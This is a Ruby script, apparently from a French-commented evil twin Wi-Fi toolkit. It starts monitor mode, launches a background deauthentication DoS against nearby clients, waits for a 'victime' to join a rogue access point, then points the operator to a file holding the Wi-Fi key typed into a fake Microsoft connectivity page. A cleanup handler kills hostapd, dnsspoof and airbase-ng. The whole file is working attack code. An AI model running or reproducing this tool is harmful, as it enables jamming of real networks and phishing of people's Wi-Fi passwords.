#!/usr/bin/env ruby


require 'gtk2'
require 'open3'
require 'highline/import'


trap "SIGINT" do
  puts "\e[1;94m[*] Exiting and cleaning your files....\e[0m"
sleep 3
Dir.chdir '/tmp'
sleep 1
if File.exist?("hostapd.psk")
`rm -rf hostapd.psk`
`rm -rf *.pid`
`killall hostapd`
`rm -rf *.conf`
`killall dnsspoof`
`killall xterm`
Dir.chdir '/tmp/hostbase-1.1FR'
sleep 1
`rm -rf *.txt`
puts "Reseting your second wifi card as wlan1..."
`airmon-ng stop wlan5mon`
sleep 5
`ifconfig wlan5 down`
`ip link set wlan5 name wlan1`
`ifconfig wlan1 up`
         sleep 4
`systemctl enable NetworkManager.service`
sleep 2
`systemctl start NetworkManager.service`
sleep 4
`rm -rf /var/lib/dhcp/dhcpd.leases`
puts "Bye..."
exit
else
`rm -rf *.pid`
`killall airbase-ng`
`rm -rf *.conf`
`killall dnsspoof`
`killall xterm`
Dir.chdir '/tmp/hostbase-1.1FR'
sleep 1
`rm -rf *.txt`
puts "Reseting your second wifi card as wlan1..."
`airmon-ng stop wlan5mon`
sleep 5
`ifconfig wlan5 down`
`ip link set wlan5 name wlan1`
`ifconfig wlan1 up`
         sleep 4
`systemctl enable NetworkManager.service`
sleep 4
`systemctl start NetworkManager.service`
sleep 5
`rm -rf /var/lib/dhcp/dhcpd.leases`
puts "Bye..."
exit
end
end


class Init
def self.interface
load 'accessdos.rb'
puts "Starting your second wifi-card..."
system "airmon-ng start #{$cartedos}"
sleep 5
Init.activeDos
end

def self.activeDos
puts "Active DoS will start now..."
dos = Thread.new { `bash rundos.sh` }  # ON balance la dos dansun thread qui s'éxécute en arrière plan (c'est plus propre je trouve).
Init.victimeAttente  # on appelle la fonction dont on a besoin
sleep(5000000)  # Correspond a la durée de vie du thread dos, on peut ici définir une tache a faire pendant X temps et elle s'arretera a la fin de ce temps, dans notre cas  on met un temps très long pour maintenir l'attaque.
end


def self.victimeAttente      
puts "En attente de la victime... appuyez sur CTRL+C pour quitter..."
until File.read('hostapd.txt').include?('STARTED')
sleep 1
end
puts "\e[1;32m[*] Victime connectée.\e[0m"
puts "\e[1;32m[*] Se rendre sur la page de tchat.\e[0m"
puts "\e[1;94m[*] Commande pour voir si la clé a été rentré: cat /var/www/msftconnecttest/cle.txt\e[0m"
end
end

################################### Airbase dos

class Combo   # A VOIR SI mettre une fonction hostapd.txt avec include('associated')
def self.interface
load 'accessdos.rb'
puts "Starting your second wifi-card..."
system "airmon-ng start #{$cartedos}"
sleep 5
Combo.dosAirbase
end

def self.dosAirbase
puts "Active DoS will start now..."
dos = Thread.new { `bash rundosdev.sh` }  # ON balance la dos dansun thread qui s'éxécute en arrière plan (c'est plus propre je trouve).
Combo.waitVictime  # on appelle la fonction dont on a besoin
sleep(5000000)  # Correspond a la durée de vie du thread dos, on peut ici définir une tache a faire pendant X temps et elle s'arretera a la fin de ce temps, dans notre cas  on met un temps très long pour maintenir l'attaque.
end

def self.waitVictime
puts "En attente de la victime... appuyez sur CTRL+C pour quitter..."
until File.read('hostapd.txt').include?('assosiated')
sleep 1
end
puts "\e[1;32m[*] Victime connectée.\e[0m"
puts "\e[1;32m[*] Se rendre sur la page de tchat.\e[0m"
puts "\e[1;94m[*] Commande pour voir si la clé a été rentré: cat /var/www/msftconnecttest/cle.txt\e[0m"
end
end
